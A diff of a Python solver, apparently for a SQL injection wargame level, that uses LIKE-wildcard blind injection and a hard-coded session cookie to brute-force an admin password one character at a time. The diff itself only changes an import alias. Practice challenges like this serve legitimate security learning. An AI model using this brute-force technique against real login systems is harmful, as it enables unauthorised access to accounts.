@@ -1,4 +1,4 @@
-import requests as r
+import requests
 
 url = 'https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php'
 cookie = {"PHPSESSID" : 'ovbfdu14h0vaeamskdlr10nttu'}
@@ -14,7 +14,7 @@ for i in range(8):
         cash_1 = ''
     for pw in range(ord('0'), ord('z')):
         param = {'pw': f'{result_pw+chr(pw)}%'}
-        res = r.get(url,params=param, cookies=cookie)
+        res = requests.get(url,params=param, cookies=cookie)
         if not "<hr><br><code>" in res.text:
             if "Hello admin" in res.text: # Hello admin | Hello guest를 바꿔가며 pw를 알아낼 수 있음
                 if chr(pw) != '_':
